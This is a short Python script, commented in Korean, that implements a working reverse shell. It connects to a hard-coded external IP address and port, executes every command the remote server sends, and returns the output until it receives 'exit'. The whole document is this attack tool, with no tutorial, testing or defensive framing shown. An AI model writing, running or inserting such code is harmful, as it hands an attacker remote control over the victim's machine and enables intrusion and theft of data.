import socket
import subprocess
import os

def reverse_shell():
    # 서버의 IP 주소와 포트 번호를 설정
    server_ip = "221.167.117.21"  # 서버의 IP 주소
    server_port = 45454  # 서버의 포트 번호

    # 소켓 객체를 생성
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # 서버에 연결
    s.connect((server_ip, server_port))

    # 무한 루프를 통해 명령어를 서버로부터 수신하고 실행
    while True:
        # 서버로부터 명령어 수신
        command = s.recv(1024).decode()

        # 명령어가 'exit'일 경우 루프를 종료
        if command.lower() == "exit":
            break

        # 명령어 실행
        output = subprocess.getoutput(command)

        # 실행 결과를 서버로 전송
        s.send(output.encode())

    # 소켓 연결 종료
    s.close()

if __name__ == "__main__":
    reverse_shell()
